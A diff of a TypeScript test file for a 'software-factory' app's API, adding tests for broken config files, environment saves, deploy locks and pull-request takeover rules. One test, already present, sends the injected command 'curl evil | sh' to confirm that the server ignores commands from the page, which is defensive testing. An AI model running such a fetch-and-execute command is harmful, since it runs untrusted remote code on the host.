@@ -126,6 +126,7 @@ beforeEach(() => {
 		cli,
 		engine,
 		versions: new Releases({
+			mayTouch: () => true,
 			root: dir,
 			dir: join(dir, "releases"),
 			repo: "me/software-factory",
@@ -211,6 +212,23 @@ describe("never touch", () => {
 		expect(body.repos.map((r: { repo: string }) => r.repo)).toEqual(["me/fairway"]);
 		expect(body.skipped).toBe(2);
 		expect(text).not.toContain("client-work");
+	});
+
+	it("saves a rule even when the config file is broken", async () => {
+		writeFileSync(store.file.path, "{ nope");
+		const res = await app.request("/api/settings/projects", {
+			method: "PUT",
+			headers: SESSION,
+			body: JSON.stringify({ cloneFolder: store.settings().projects.cloneFolder, neverTouch: ["acme-*"] }),
+		});
+		expect(res.status).toBe(200);
+		expect(store.neverTouch()).toEqual(["acme-*"]);
+	});
+
+	it("tells the page the config file is broken", async () => {
+		writeFileSync(store.file.path, "{ nope");
+		const shell = await (await app.request("/api/shell", { headers: HOST })).json();
+		expect(shell.configError).toMatch(/isn't valid JSON/);
 	});
 
 	it("refuses to add or clone a matching repo", async () => {
@@ -560,6 +578,35 @@ describe("environments", () => {
 		expect((await view("Staging")).deploy?.state).toBe("stopped");
 	});
 
+	it("keeps fields from a newer version when environments are saved", async () => {
+		seed();
+		store.file.update((c) => ({
+			...c,
+			environments: { fairway: [{ ...STAGING, fromNewer: 1 }, PROD] },
+		}));
+		const res = await app.request("/api/projects/fairway/environments", {
+			method: "PUT",
+			headers: SESSION,
+			body: JSON.stringify({ environments: [STAGING, PROD] }),
+		});
+		expect(res.status).toBe(200);
+		expect(store.file.read().environments.fairway?.[0]).toMatchObject({ fromNewer: 1 });
+	});
+
+	it("won't remove an environment while it's deploying", async () => {
+		seed();
+		holdDeploy = true;
+		await post("/api/environments/deploy", { project: "fairway", env: "Staging" });
+		const res = await app.request("/api/projects/fairway/environments", {
+			method: "PUT",
+			headers: SESSION,
+			body: JSON.stringify({ environments: [PROD] }),
+		});
+		expect(res.status).toBe(409);
+		expect(await res.text()).toContain("Staging is deploying");
+		expect(store.file.read().environments.fairway?.map((e) => e.name)).toContain("Staging");
+	});
+
 	it("takes no command from the page", async () => {
 		seed();
 		await post("/api/environments/deploy", { project: "fairway", env: "Staging", command: "curl evil | sh" });
@@ -791,6 +838,18 @@ describe("issues", () => {
 			headers: SESSION,
 			body: JSON.stringify(data),
 		});
+	it("won't let a merging mode take over a PR the factory didn't open", async () => {
+		const res = await post("/api/work-orders", {
+			project: "fairway",
+			type: "Bug fix",
+			description: "Bring it up to date",
+			mode: "send",
+			source: { kind: "stale_pr", prNumber: 7 },
+		});
+		expect(res.status).toBe(409);
+		expect(await res.text()).toContain("can't merge a PR the factory didn't open");
+	});
+
 	const fix = (mode: string, extra: object = {}) =>
 		post("/api/work-orders", {
 			project: "fairway",
